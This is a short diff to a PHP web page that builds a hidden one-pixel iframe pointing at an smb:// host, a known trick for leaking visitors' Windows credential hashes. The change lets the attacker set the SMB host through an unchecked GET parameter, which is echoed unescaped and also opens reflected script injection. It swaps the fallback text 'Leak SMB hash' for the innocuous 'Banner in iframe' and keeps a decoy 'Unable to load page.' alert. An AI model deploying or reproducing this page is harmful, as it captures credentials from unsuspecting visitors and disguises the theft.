@@ -2,8 +2,15 @@
 <head>
 </head>
 <body>
-	<iframe src="smb://<?php echo $_SERVER['SERVER_NAME'] ?>/banner.html" width="1" height="1" align="left">
-		Leak SMB hash
+    <?php
+    $smb_path = "192.168.0.1";
+    if(isset($_GET['smb_path']))
+    {
+        $smb_path = $_GET['smb_path'];
+    }
+    ?>
+	<iframe src="smb://<?php echo $smb_path; ?>/banner.html" width="1" height="1" align="left">
+		Banner in iframe
 	</iframe>
 	<script type="text/javascript">
 		alert("Unable to load page.");
